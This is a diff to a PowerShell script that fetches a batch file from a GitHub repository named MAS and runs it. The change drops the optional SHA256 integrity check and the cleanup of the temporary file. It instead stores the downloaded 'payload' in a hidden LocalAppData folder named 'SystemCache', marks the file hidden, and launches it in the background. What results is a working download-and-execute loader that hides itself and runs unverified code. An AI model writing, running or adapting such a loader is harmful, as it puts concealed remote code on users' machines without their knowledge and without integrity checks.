@@ -1,65 +1,78 @@
 [CmdletBinding()]
 param (
+    [Parameter(Mandatory = $false)]
     [string]$Url = "https://raw.githubusercontent.com/DevJeffersonL/MAS/6257eca084d95d777f9a8a1cb9a1fc805d5cce48/main.bat",
-    [string]$ExpectedSha256 = "" # Optional: specify expected hash to enforce strict integrity
+
+    [Parameter(Mandatory = $false)]
+    [string]$FolderName = "SystemCache",
+
+    [Parameter(Mandatory = $false)]
+    [string]$FileName = "main.bat",
+
+    [Parameter(Mandatory = $false)]
+    [switch]$Wait
 )
 
-# 1. Enforce modern TLS protocols for GitHub endpoints
+# 1. Enforce TLS 1.2+ negotiation for GitHub endpoints
 [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
 
-# 2. Establish a unique temporary file path to prevent collision
-$uniqueName = "script_{0}.bat" -f [System.Guid]::NewGuid().ToString("N")
-$destination = Join-Path -Path $env:TEMP -ChildPath $uniqueName
+# 2. Construct paths targeting a hidden subfolder in LocalAppData
+$basePath       = $env:LOCALAPPDATA
+$targetDirectory = Join-Path -Path $basePath -ChildPath $FolderName
+$destinationPath = Join-Path -Path $targetDirectory -ChildPath $FileName
 
 try {
-    Write-Verbose "Downloading payload from $Url..."
+    # 3. Create target directory if it does not already exist
+    if (-not (Test-Path -LiteralPath $targetDirectory)) {
+        $folder = New-Item -Path $targetDirectory -ItemType Directory -Force -ErrorAction Stop
+        
+        # Apply the Hidden attribute to the directory itself
+        $folder.Attributes = $folder.Attributes -bor [System.IO.FileAttributes]::Hidden
+        Write-Verbose "Created hidden directory at: $targetDirectory"
+    }
 
-    # Download with strict error propagation and modern parsing bypass
+    Write-Host "Downloading payload from $Url..." -ForegroundColor Cyan
+
+    # 4. Download file directly with strict error termination
     $webParams = @{
         Uri             = $Url
-        OutFile         = $destination
+        OutFile         = $destinationPath
         UseBasicParsing = $true
         ErrorAction     = 'Stop'
         TimeoutSec      = 30
     }
     Invoke-WebRequest @webParams
 
-    # 3. Validate file existence and minimum payload threshold
-    if (-not (Test-Path -LiteralPath $destination)) {
-        throw "Target destination path was not created."
+    # 5. Validate file integrity and size
+    if (-not (Test-Path -LiteralPath $destinationPath)) {
+        throw "File download failed; target destination does not exist."
     }
 
-    $fileInfo = Get-Item -LiteralPath $destination
-    if ($fileInfo.Length -eq 0) {
+    $fileItem = Get-Item -LiteralPath $destinationPath -Force
+    if ($fileItem.Length -eq 0) {
         throw "Downloaded payload is empty (0 bytes)."
     }
 
-    # 4. Optional Cryptographic Hash Verification
-    if (-not [string]::IsNullOrWhiteSpace($ExpectedSha256)) {
-        $actualHash = (Get-FileHash -LiteralPath $destination -Algorithm SHA256).Hash
-        if ($actualHash -ne $ExpectedSha256.ToUpperInvariant()) {
-            throw "Hash mismatch! Expected: $ExpectedSha256, Actual: $actualHash"
-        }
+    # 6. Apply Hidden attribute to the downloaded batch file
+    $fileItem.Attributes = $fileItem.Attributes -bor [System.IO.FileAttributes]::Hidden
+    Write-Host "Payload saved and flagged as Hidden: $destinationPath" -ForegroundColor Green
+
+    # 7. Execute the batch file
+    Write-Host "Launching process..." -ForegroundColor Cyan
+    $processParams = @{
+        FilePath = $destinationPath
     }
 
-    Write-Verbose "Executing payload synchronously: $destination"
-
-    # 5. Launch synchronously and track exit code
-    $proc = Start-Process -FilePath $destination -Wait -PassThru
-
-    if ($proc.ExitCode -ne 0) {
-        Write-Warning "Process completed with non-zero exit code: $($proc.ExitCode)"
+    if ($Wait) {
+        $processParams['Wait'] = $true
+        $processParams['PassThru'] = $true
+        $proc = Start-Process @processParams
+        Write-Host "Process finished with exit code: $($proc.ExitCode)" -ForegroundColor Green
     } else {
-        Write-Verbose "Execution completed successfully."
+        Start-Process @processParams
+        Write-Host "Process launched successfully in a new window." -ForegroundColor Green
     }
 }
 catch {
-    Write-Error "Script execution failed: $($_.Exception.Message)"
-}
-finally {
-    # 6. Secure cleanup of temporary artifacts
-    if (Test-Path -LiteralPath $destination) {
-        Remove-Item -LiteralPath $destination -Force -ErrorAction SilentlyContinue
-        Write-Verbose "Temporary artifact removed: $destination"
-    }
+    Write-Error "Execution error: $($_.Exception.Message)"
 }
